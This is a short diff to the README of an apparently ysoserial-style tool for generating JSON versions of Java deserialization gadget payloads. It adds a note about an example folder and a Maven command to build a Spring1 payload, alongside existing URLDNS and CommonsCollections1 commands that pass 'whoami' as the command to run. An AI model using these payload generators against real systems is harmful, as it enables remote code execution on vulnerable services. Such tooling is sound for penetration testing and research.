@@ -22,7 +22,9 @@ Requires Java 1.7+ and Maven 3.x+
 
 ## Generating Payload
 
-To create URLDNS  equivalent json payload:
+The /example folder contains generated payloads.
+
+To create URLDNS  equivalent json payload:  
 
 ```mvn exec:java  -Dexec.mainClass="ysoserial.payloads.URLDNS" -Dexec.args="https://google.com"```
 
@@ -30,4 +32,6 @@ To create Collections1 equivalent json payload:
 
 ```mvn exec:java  -Dexec.mainClass="ysoserial.payloads.CommonsCollections1" -Dexec.args="whoami"```
 
+To create Spring1 equivalent json payload:
 
+```mvn exec:java  -Dexec.mainClass="ysoserial.payloads.Spring1" -Dexec.args="whoami"```
